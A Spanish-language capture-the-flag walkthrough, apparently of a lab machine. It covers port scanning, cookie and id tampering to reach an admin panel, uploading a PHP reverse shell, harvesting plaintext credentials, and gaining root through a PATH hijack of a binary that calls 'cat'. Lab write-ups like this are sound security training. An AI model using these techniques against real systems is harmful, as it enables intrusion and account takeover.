@@ -1,0 +1,112 @@
+el escanedo de puertos nos muestra los siguietes servicios 
+disponibles
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Welcome
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Ingresamos a la pagina principal para evaluar el puerto HTTP 
+
+En este paso al ingresar a la pagina nos damos cuenta por mera 
+intuicion al leer el codigo que esta utilizando una nueva ruta
+
+/cdn-cgi/login
+
+en esta parte vemos que no es vulnerable el panel de login,
+pero tenemos acceso como invitados.
+
+
+al entrar vemos que nos muestra nuestra id de sesion establecido
+en las cookies
+
+nuestro id como guest es
+	2434
+
+pero si vamos a la pestaña acounts veremos que se esta realizando
+una peticion y enviando datos.
+
+la url se veria haci
+	url : http://10.129.48.119/cdn-cgi/login/admin.php?content=accounts&id=2
+
+pero nuestra carga util sera con el id=1 y vemos su id cookie,
+procedemos a realizar el cookie hijacking
+	url_admin_cookie : http://10.129.48.119/cdn-cgi/login/admin.php?content=accounts&id=1 
+	cookie : 34324
+
+al hacer esto podremos acceder al panel de carga de archivos
+aqui enviaremos nuestra revershell con ayuda del script, de 
+pentestmonkey
+
+nos ponemos por escucha en el puerto 443
+subimos nuestro revershell.php
+nuestro archivo se cargara en la siguiente ruta
+	ruta : /uploads/revershell.php
+al ingresar a esta inmediatamente tendremos nuestra revershell
+
+
+Ya estando dentro del sistema vemos la flag, pero ahora no nos 
+interesa necesitamos escalar privilegios.
+
+Vamos a la ruta donde esta montada la app, nos encontramos con
+las siguientes ubicasiones.
+	ruta : /var/www/html/cdn-cgi/login
+	files : {
+			admin.php  db.php  index.php  script.js
+		}
+
+me interesa el que dice db.php
+
+al abrir este archivo nos encontramos con credenciales y un usuario
+
+	user : robert
+	passwd : M3g4C0rpUs3r!
+
+con estas credenciales nos servira para obtener acceso por ssh
+
+vemos nuestro id de permisos
+{
+id : uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+}
+
+Ahora veamos nuestro archivo de admin.php
+{
+route : /var/www/html/cdn-cgi/login/admin.php,
+commmand : cat * | grep -i passw*,
+output : {if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
+<input type="password" name="password" placeholder="Password" />}
+}
+{
+	user : admin
+	password = MEGACORP_4dm1n!!
+}
+
+find / -group bugtracker 2>/dev/null
+ESto nos traera todos los permisos que tenemos de ejecusion
+
+esto nos dara que tenemos acceso hacia esta ruta y archivo
+
+{
+	ruta : /usr/bin
+	file : bugtracker
+}
+
+
+ejecutamos bugtracker y vemos que este nos pide un id, el cual si ingresamos hasta llegar a 12 donde nos va dar un error
+
+esto porque el ID esta agregado al binario y este no encuentra el binario de cat
+{
+	creamos un archivo en tmp : cat
+	contendra : /bin/sh
+	permisos : x o 600
+	export al path : export PATH=/tmp:$PATH 
+}
+
+
+Luego procedemos a ejecutar nuestro comando ingresamos el id del cat y huala somos root
